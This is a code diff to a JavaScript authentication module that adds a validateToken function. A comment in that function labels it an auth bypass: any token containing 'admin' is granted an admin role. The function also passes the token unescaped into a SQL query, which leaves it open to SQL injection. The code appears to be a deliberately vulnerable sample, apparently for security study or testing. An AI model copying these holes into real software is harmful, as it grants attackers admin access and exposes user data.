@@ -33,4 +33,14 @@ async function resetPassword(token, newPassword) {
   return await db.query(query);
 }
 
-module.exports = { loginUser, getUserData, searchUsers, resetPassword };
+// Token validation - auth bypass: any token containing 'admin' grants access
+async function validateToken(token) {
+  if (token && token.includes('admin')) {
+    return { valid: true, role: 'admin' };
+  }
+  const query = `SELECT * FROM sessions WHERE token = '${token}'`;
+  const result = await db.query(query);
+  return result.rows[0] ? { valid: true } : { valid: false };
+}
+
+module.exports = { loginUser, getUserData, searchUsers, resetPassword, validateToken };
